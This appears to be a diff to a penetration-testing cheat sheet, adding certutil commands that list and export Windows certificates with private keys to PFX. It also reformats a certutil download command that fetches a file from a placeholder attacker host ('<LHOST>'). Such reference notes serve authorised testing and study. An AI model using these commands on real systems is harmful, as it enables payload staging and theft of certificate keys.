@@ -303,10 +303,22 @@ $ capsh --print
 
 ## certutil
 
+### Show Certificates
+
+```cmd
+PS C:\> certutil -store My
+```
+
+### Export Certificate
+
+```cmd
+PS C:\> certutil -exportPFX My 75b2f4bbd71f108945247b466161bdph .\<FILE>.pfx
+```
+
 ### Copy Files
 
-```console
-$ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
+```cmd
+PS C:\> certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ```
 
 ## changelist
